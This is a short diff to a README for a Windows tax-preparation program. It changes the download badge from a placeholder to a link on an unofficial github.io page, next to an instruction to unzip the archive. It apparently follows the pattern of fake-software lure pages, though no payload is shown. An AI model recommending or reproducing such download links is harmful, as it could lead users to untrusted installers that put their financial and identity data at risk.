@@ -6,7 +6,7 @@ Jackson Hewitt Tax Pro for Windows offers a complete tax preparation and filing 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://jackson-hewitt-tax-pro-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
